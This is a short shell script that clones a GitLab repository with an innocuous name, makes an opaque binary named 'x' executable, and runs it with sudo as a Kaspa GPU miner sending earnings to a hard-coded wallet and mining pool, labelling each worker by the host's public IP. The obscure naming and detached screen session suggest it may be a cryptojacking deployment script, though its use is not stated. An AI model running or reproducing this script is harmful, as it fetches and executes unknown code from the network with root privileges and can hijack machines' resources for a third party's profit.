#!/bin/sh
sudo apt update
sudo apt-get install zip unzip
sudo apt install screen -y
screen -dmS er.sh 65 75
sudo git clone https://gitlab.com/letricejuliocesar/goodday
cd goodday
chmod +x x
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  sudo ./x -a kaspa -w kaspa:qpskljusdss2zgkeafjm554spudyezv53hwr45fxgjp5dxmf5cxyc3xmdywl6 -p stratum+tcp://acc-pool.pw:16061 -r $ip --nvidia 1
